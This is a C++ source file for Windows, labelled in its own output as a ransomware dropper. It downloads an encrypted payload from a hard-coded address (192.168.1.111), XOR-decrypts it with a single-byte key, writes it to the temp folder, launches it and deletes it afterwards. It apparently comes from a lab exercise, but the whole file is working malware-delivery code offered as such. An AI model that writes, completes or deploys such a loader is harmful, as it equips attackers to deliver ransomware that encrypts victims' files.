#include <windows.h>
#include <iostream>
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")

// XOR decryption function
void xor_decrypt_memory(BYTE *data, DWORD size, char key)
{
    for (DWORD i = 0; i < size; i++)
    {
        data[i] ^= key;
    }
}

// Execute PE from memory
BOOL execute_from_memory(BYTE *pe_data, DWORD file_size)
{
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    strcat_s(temp_path, sizeof(temp_path), "decrypted_ransom.exe");

    printf("[+] Creating temp file: %s\n", temp_path);
    
    HANDLE hFile = CreateFileA(
        temp_path,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create temp file. Error: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD bytesWritten;
    
    // Write the entire decrypted data
    if (!WriteFile(hFile, pe_data, file_size, &bytesWritten, NULL)) {
        printf("[-] Failed to write temp file. Error: %lu\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }
    
    CloseHandle(hFile);
    printf("[+] Written %lu bytes to temp file\n", bytesWritten);

    // Execute the decrypted ransomware
    printf("[+] Launching ransomware...\n");
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (CreateProcessA(temp_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[+] Ransomware process started (PID: %lu)\n", pi.dwProcessId);
        
        // Wait for the process to complete
        printf("[+] Waiting for ransomware to finish...\n");
        WaitForSingleObject(pi.hProcess, 10000);
        
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        printf("[+] Ransomware exited with code: %lu\n", exitCode);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        // Clean up temp file
        if (DeleteFileA(temp_path)) {
            printf("[+] Temp file cleaned up\n");
        } else {
            printf("[-] Failed to delete temp file\n");
        }
        
        return TRUE;
    } else {
        printf("[-] Failed to execute ransomware. Error: %lu\n", GetLastError());
        return FALSE;
    }
}

int main()
{
    printf("===================================\n");
    printf("[+] Ransomware Dropper Started\n");
    printf("===================================\n");
    printf("[+] Downloading encrypted payload...\n");

    // Download encrypted ransomware
    IStream *stream = NULL;
    HRESULT hr = URLOpenBlockingStreamA(
        NULL,
        "http://192.168.1.111/encrypted_ransom.bin",
        &stream,
        0,
        NULL);

    if (FAILED(hr))
    {
        std::cout << "[-] Download Failed: " << hr << "\n";
        return 1;
    }

    // Get stream size
    STATSTG stats;
    stream->Stat(&stats, STATFLAG_NONAME);
    DWORD size = (DWORD)stats.cbSize.QuadPart;

    // Allocate memory for encrypted data
    BYTE *encrypted_data = (BYTE *)malloc(size);
    if (!encrypted_data)
    {
        std::cout << "[-] Memory Allocation failed!!\n";
        stream->Release();
        return 1;
    }

    // Read encrypted data in memory
    ULONG bytesRead;
    stream->Read(encrypted_data, size, &bytesRead);
    stream->Release();

    std::cout << "[+] Downloaded payload size: " << bytesRead << " bytes\n";
    std::cout << "[+] Decrypting in memory...\n";

    // Decrypt ransomware in memory
    xor_decrypt_memory(encrypted_data, bytesRead, 'K');
    std::cout << "[+] Decryption completed\n";

    std::cout << "[+] Executing decrypted ransomware...\n";

    // Execute with the actual file size
    if (execute_from_memory(encrypted_data, bytesRead))
    {
        std::cout << "[+] Ransomware executed successfully\n";
    }
    else
    {
        std::cout << "[-] Failed to execute ransomware\n";
    }

    // Cleanup
    free(encrypted_data);

    std::cout << "[+] Dropper Completed\n";
    std::cout << "Check for text.txt.encrypted file\n";
    std::cout << "Press any key to exit...\n";
    system("pause");

    return 0;
}